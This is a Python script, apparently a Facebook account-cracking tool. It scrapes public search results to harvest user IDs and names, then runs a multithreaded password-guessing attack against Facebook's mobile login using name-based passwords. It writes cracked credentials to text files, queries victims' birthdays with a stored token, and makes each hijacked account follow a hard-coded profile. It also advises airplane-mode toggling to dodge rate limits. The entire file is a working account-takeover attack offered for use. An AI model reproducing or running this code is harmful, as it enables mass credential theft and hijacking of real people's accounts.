#!/usr/bin/python3

import os

try:

    import requests

except ImportError:

    print('\n [✓] installing requests !...\n')

    os.system('pip install requests')

try:

    import concurrent.futures

except ImportError:

    print('\n [✓] installing futures !...\n')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\n [✓] installing bs4 !...\n')

    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib

from concurrent.futures import ThreadPoolExecutor as sarfrazFILE

from datetime import datetime

from bs4 import BeautifulSoup

import bs4, re, time, requests, datetime, os, sys, random, platform,uuid,zlib

from concurrent.futures import ThreadPoolExecutor as tred

from bs4 import BeautifulSoup as parser

from datetime import datetime

from time import sleep

hp = platform.platform()

ses = requests.Session()

dump=[]

nama=[]

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

P = '\x1b[1;97m' # 

M = '\033[1;31m' # 

H = '\033[1;32m' # 

K = '\x1b[1;97m' # 

B = '\x1b[1;97m' # 

U = '\x1b[1;97m' # 

O = '\x1b[1;97m' # 

N = '\x1b[0m'    # 

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,fuck,pwBaru=[],[],[]

ok = []

cp = []

id = []

user = []

loop = 0

url_lookup = "https://lookup-id.com/"

url_mb = "https://m.facebook.com"

url_ip = "https://www.httpbin.org/ip"

header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 12; RMX3195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"}

bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}

done = False

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.01)

logo =        ("""   

\x1b[1;91m█

┏━━┓╋╋┏┓

┃┏┓┣━━╋╋━┳┳┳┳┳┓

┃┣┫┃┃┃┃┃┃┃┃┃┃┏┛

┗┛┗┻┻┻┻┻┻━┻━┻┛

                                       \x1b[1;96m𝙉 \x1b[1;94m𝙏 \033[1;31m𝘼𝙡𝙞𝙛 \x1b[1;91m𝙎𝙝𝙚𝙞𝙠𝙝

                                                  

\033[1;32m══════════════════════════════════════════════════════

\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           aminur 14x 69

\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          md aminur rahman

\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           aminur69 

\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             0.1

\033[1;32m══════════════════════════════════════════════════════ """)                                              

def n3ob1(OK,cp):

	if not len(OK) != 0:	    pass

	if len(cp) != 0:

	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mN3OB_OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mN3OB_CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back FILE Menu ")

	    n3ob()

def n3ob():

    os.system('clear')

    print(logo)

    os.system('espeak -a 300 "Welcome To NT File Cracking"')

    ipm = requests.get(url_ip).json()

    todz = ''

    IP = ipm['origin']

    print(' [1] Start File Cloning')

    print(' [2] Create File [ Name Disit ]')

    print(' [E] exit ')

    print('')

    _n3ob___ = input(' [?] Choose option : ')

    if _n3ob___ in ('1', '01'):

        __xxx__().n3ob(id)

    if _n3ob___ in ('2', '02'):

        create_file()

    if _n3ob___ in ('E', 'ee'):

        pass

class __xxx__:

    def __init__(self):

        self.id = []

    def n3ob(self,id):

        os.system("clear")

        print(logo)

        self.cnt = input('Put File Name : ')

        self.id = open(self.cnt).read().splitlines()

        os.system('clear')

        print(logo)

        print("")

        ___worldwide___ = ('y')

        if ___worldwide___ in ('yes','Yes','Y', 'y'):

            self.__pler__()

        else:

            print(' [!] Choose Correct One');

            self.n3ob(id)

    def __metode__(self, user, __chi__, cebok):

        global ok,cp,loop

        sys.stdout.write(f"\r \x1b[1;97m[N3OB-NT] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")

        sys.stdout.flush()

        try:

            for pw in __chi__:

                pw = pw.lower()

                session=requests.Session()

                header = {

                    "Host":cebok,

                    "upgrade-insecure-requests":"1",

                    "user-agent":"Mozilla/5.0 (Linux; Android 12; RMX3195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",

                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",

                    "dnt":"1",

                    "x-requested-with":"mark.via.gp",

                    "sec-fetch-site":"none",

                    "sec-fetch-mode":"navigate",

                    "sec-fetch-user":"?1",

                    "sec-fetch-dest":"document",

                    "referer":"https://m.facebook.com/",

                    "accept-encoding":"gzip, deflate br",

                    "accept-language":"en-US,en;q=0.9"

                }

                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)

                das = {

                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),

                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),

                    "uid":user,

                    "flow":"login_no_pin",

                    "pass":pw,

                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"

                }

                header1 = {

                    "Host":cebok,

                    "cache-control":"max-age=0",

                    "upgrade-insecure-requests":"1",

                    "origin":"https://"+cebok,

                    "content-type":"application/x-www-form-urlencoded",

                    "user-agent":"Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36",

                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",

                    "x-requested-with":"XMLHttpRequest",

                    "sec-fetch-site":"same-origin",

                    "sec-fetch-mode":"cors",

                    "sec-fetch-user":"empty",

                    "sec-fetch-dest":"document",

                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",

                    "accept-encoding":"gzip, deflate br",

                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"

                }

                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)

                if 'c_user' in session.cookies.get_dict():

                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                    print(f"\r{H} [N3OB-OK] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('N3OB_OK.txt' , 'a').write('%s\n' % wrt)

                    self.follow(session,coki)

                    break

                elif 'checkpoint' in session.cookies.get_dict():

                    try:

                        tokenz = open('.token.txt').read()

                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']

                        month, day, year = cp_ttl.split('/')

                        month = bulan_ttl[month]

                        print('\r%s [N3OB-OK😁] %s | %s ' % (M, user, pw))

                        wrt = '%s|%s' % (user,pw)

                        cp.append(wrt)

                        open('N3OB_OK😁.txt' , 'a').write('%s\n' % wrt)

                        break

                    except (KeyError, IOError):

                        month = ''

                        day   = ''

                        year  = ''

                    except:

                        pass

                    print('\r%s [N3OB-OK😁] %s | %s ' % (M, user, pw))

                    wrt = '%s|%s' % (user,pw)

                    cp.append(wrt)

                    open('N3OB_OK😁.txt' , 'a').write('%s\n' % wrt)

                    break

                else:

                    continue

            loop+=1

        except:

            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):

        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')

        get = r.find('a', string='Ikuti').get('href')

        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):

        print('[1] Auto Password')

        print('[2] Input Password')

        chi = input('\n [?] Choose: ')

        if chi == '':

            print('\nSelect Correct One')

            self.__pler__()

        elif chi in ('1', '01'):

            os.system("clear")

            print(logo)

            print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")

            print("\033[1;32m══════════════════════════════════════════════════════")

            print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))

            print('\033[1;37m Cracking Started...')

            print("\033[1;32m══════════════════════════════════════════════════════")

            with sarfrazFILE(max_workers=30) as FILEworld:

                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia

                    try:

                        uid, name = zsb.split('|')

                        xz = name.split(' ')

                        first, last = name.split(' ')

                        firstl = first.lower()

                        lastl = last.lower()

                        firsts = first.capitalize()

                        lasts = last.capitalize()

                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:

                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]

                        else:

                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]

                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]

                        FILEworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")

                    except:

                        pass

            n3ob1(ok,cp)

        elif chi in ('2', '02'):

            os.system("clear")

            print(logo)

            print("\033[1;37m\rEnter Password Method\033[1;37m\n")

            p1 = input('Password 1 : ')

            p2 = input('Password 2 : ')

            p3 = input('Password 3 : ')

            p4 = input('Password 4 : ')

            os.system("clear")

            print(logo)

            print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")

            print("══════════════════════════════════════════════════════")

            print('\033[1;37m Total IDs : %s ' % len(self.id))

            print('\033[1;37m Cracking Started...')

            print("══════════════════════════════════════════════════════")

            with sarfrazFILE(max_workers=30) as FILEworld:

                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia

                    try:

                        uid, name = zsb.split('|')

                        xz = name.split(' ')

                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:

                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]

                        else:

                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]

                        FILEworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")

                    except:

                        pass

            hasil(ok,cp)

        else:

            print('\n Select Valid One')

            self.__pler__()

def create_file():

    os.system('clear')

    print(logo)

    print('  [1] Create file Name Disit')

    print('  [2] Contact Admin')

    print('  [B] Back to main menu')

    print(50*'-')

    cf = input('  Choose method: ')

    if cf =='1':

        crack_search()

    elif cf =='2':

        os.system('xdg-open https://facebook.com/100074591152479')

        n3ob()

    elif cf =='3':

        likes()

    elif cf =='3' or cf =='b' or cf =='B':

        main()

    else:

        print('\n  Choose correct option ...')

        time.sleep(1)

        create_file()

def crack_search():

	dump=[]

	nama = []

	custom = [" muhammad"," khan"," Hossain"," ali"," amran"," hasan"," ariyan"," aslam"," kumar"," patwari"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "]

	custom2 = ["Mohammed ","md ","ariyan ","Md ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "]

	print(f' Enter Name ')

	print (' Example :  ariyan srabon alif etc...')

	nam = input(f' nama : ').split(",")

	time.sleep(1)

	sf = input(' Enter File Nama : ')

	for ser in nam:		

		for belakang in custom:

			id = ser+belakang

			nama.append(id)

		for depan in custom2:

			id = depan+ser

			nama.append(id)

		for depan1 in custom2:

			id = depan1+ser+belakang

	with tred(max_workers=35) as thread:

		for id in nama:

			link = f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID"

			thread.submit(cari_nama,link,sf)

	

		

def cari_nama(link,sf):

	r = parser(ses.get(str(link)).text,'html.parser')

	for x in r.find_all('td'):

		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))

		for uid,nama in data:

			if 'profile.php?' in uid:

				uid = re.findall('id=(.*)',str(uid))[0]

			elif '<span' in nama:

				nama = re.findall('(.*?)\<',str(nama))[0]

			bo = uid+'|'+nama

			if bo in dump:pass

			else:

				if '1000' in bo:

					dump.append(bo)

					open(sf, 'a').write(bo+'\n')

				else:pass

				

	try:

		link = r.find('a',string='See more results').get('href')

		if(link):

			print('\r being dumped %s id'%(len(dump)),end=" ")

			sys.stdout.flush()

			cari_nama(link)

	except:pass

    

n3ob()
